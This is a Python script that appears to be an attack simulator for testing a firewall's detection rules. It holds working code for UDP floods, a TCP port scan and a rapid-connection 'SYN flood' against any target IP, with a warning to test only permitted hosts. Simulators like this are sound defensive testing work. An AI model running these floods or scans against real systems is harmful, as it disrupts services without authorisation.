#!/usr/bin/env python3
"""
dos_sim.py — Multi-mode attack simulator for the Adaptive AI Firewall.

Usage:
  python dos_sim.py --mode dos       --target 192.168.1.100 [--port 80]
  python dos_sim.py --mode portscan  --target 192.168.1.100
  python dos_sim.py --mode udpflood  --target 192.168.1.100 [--port 9999]
  python dos_sim.py --mode synflood  --target 192.168.1.100 [--port 80]

WARNING: Only run against hosts you own / have permission to test.
         Do NOT target 127.0.0.1 — loopback is intentionally whitelisted.
"""

import argparse
import socket
import time
import threading

def dos_flood(target, port, duration=15, threads=4):
    """High-rate UDP flood to trigger DoS detection (>200 pkt/s)."""
    payload = b"X" * 512
    stop_event = threading.Event()

    def flood_worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        count = 0
        while not stop_event.is_set():
            try:
                s.sendto(payload, (target, port))
                count += 1
            except Exception:
                pass
        s.close()
        return count

    print(f"[*] DoS UDP Flood → {target}:{port} for {duration}s ({threads} threads)...")
    pool = [threading.Thread(target=flood_worker) for _ in range(threads)]
    for t in pool:
        t.start()
    time.sleep(duration)
    stop_event.set()
    for t in pool:
        t.join()
    print("[+] DoS simulation complete.")


def port_scan(target, start_port=1, end_port=100, delay=0.01):
    """TCP SYN-style port scan — touches >15 ports to trigger PortScan rule."""
    print(f"[*] Port Scan → {target}:{start_port}-{end_port}...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        result = s.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
            print(f"  [OPEN] {target}:{port}")
        s.close()
        time.sleep(delay)
    print(f"[+] Scan done. Open ports: {open_ports if open_ports else 'none'}")


def udp_flood(target, port, duration=15):
    """Large-payload UDP flood to exceed the 500 KB/s byte-rate threshold."""
    payload = b"A" * 1400   # near-MTU payloads for maximum byte throughput
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    total_bytes = 0
    print(f"[*] UDP Flood → {target}:{port} for {duration}s (large payloads)...")
    t_end = time.time() + duration
    while time.time() < t_end:
        try:
            s.sendto(payload, (target, port))
            total_bytes += len(payload)
        except Exception:
            pass
    s.close()
    print(f"[+] UDP Flood done. Sent {total_bytes / 1024:.1f} KB")


def syn_flood(target, port, duration=10):
    """Rapid TCP connection attempts (SYN flood simulation — no scapy needed)."""
    print(f"[*] SYN Flood → {target}:{port} for {duration}s...")
    count = 0
    t_end = time.time() + duration
    while time.time() < t_end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((target, port))
            s.close()
            count += 1
        except Exception:
            pass
    print(f"[+] SYN Flood done. Attempts: {count}")


def main():
    parser = argparse.ArgumentParser(description="Adaptive AI Firewall Attack Simulator")
    parser.add_argument("--mode",   required=True,
                        choices=["dos", "portscan", "udpflood", "synflood"],
                        help="Attack mode")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port",   type=int, default=9999, help="Target port (default 9999)")
    parser.add_argument("--duration", type=int, default=15, help="Attack duration in seconds")
    args = parser.parse_args()

    if args.target.startswith("127."):
        print("[!] WARNING: 127.x.x.x is loopback — it will be whitelisted by the firewall.")
        print("[!] Use a real LAN IP (e.g. 192.168.1.x) as the target.")

    if args.mode == "dos":
        dos_flood(args.target, args.port, args.duration)
    elif args.mode == "portscan":
        port_scan(args.target)
    elif args.mode == "udpflood":
        udp_flood(args.target, args.port, args.duration)
    elif args.mode == "synflood":
        syn_flood(args.target, args.port, args.duration)


if __name__ == "__main__":
    main()
